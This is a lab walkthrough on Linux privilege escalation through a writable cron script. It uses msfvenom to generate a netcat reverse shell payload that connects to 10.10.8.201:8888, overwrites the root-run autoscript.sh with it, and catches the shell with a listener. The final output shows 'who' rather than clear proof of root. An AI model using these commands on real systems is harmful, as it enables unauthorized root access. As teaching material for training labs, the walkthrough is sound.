What is Cron?

The Cron daemon is a long-running process that executes commands at specific dates and times. You can use this to schedule activities, either as one-time events or as recurring tasks. You can create a crontab file containing commands and instructions for the Cron daemon to execute.

How to view what Cronjobs are active.

We can use the command "cat /etc/crontab" to view what cron jobs are scheduled. This is something you should always check manually whenever you get a chance, especially if LinEnum, or a similar script, doesn't find anything.

Format of a Cronjob

Cronjobs exist in a certain format, being able to read that format is important if you want to exploit a cron job. 

\# = ID

m = Minute

h = Hour

dom = Day of the month

mon = Month

dow = Day of the week

user = What user the command will run as

command = What command should be run

For Example,
```
#  m   h dom mon dow user  command

17 *   1  *   *   *  root  cd / && run-parts --report /etc/cron.hourly
```
How can we exploit this?

We know from our LinEnum scan, that the file autoscript.sh, on user4's Desktop is scheduled to run every five minutes. It is owned by root, meaning that it will run with root privileges, despite the fact that we can write to this file. The task then is to create a command that will return a shell and paste it in this file. When the file runs again in five minutes the shell will be running as root.

Now, on our host machine- let's create a payload for our cron exploit using msfvenom.
```
msfvenom -p cmd/unix/reverse_netcat lhost=LOCALIP lport=8888 R
```
LOCALIP = 10.10.8.201

MSFVENOM OUTPUT
```
mkfifo /tmp/apzj; nc 10.10.8.201 8888 0</tmp/apzj | /bin/sh >/tmp/apzj 2>&1; rm /tmp/apzj
```
Lets replace the contents of the file with our payload using: "echo [MSFVENOM OUTPUT] > autoscript.sh"

```
user4@polobox:~/Desktop$ echo "mkfifo /tmp/apzj; nc 10.10.8.201 8888 0</tmp/apzj | /bin/sh >/tmp/apzj 2>&1; rm /tmp/apzj" > autoscript.sh
```

After copying the code into autoscript.sh file we wait for cron to execute the file, and start our netcat listener using: "nc -lvnp 8888" and wait for our shell to land

```
root@ip-10-10-8-201:~# nc -lvnp 8888
Listening on 0.0.0.0 8888
Connection received on 10.10.79.141 50412
who
user3    pts/0        2024-12-15 16:40 (10.10.8.201)
```

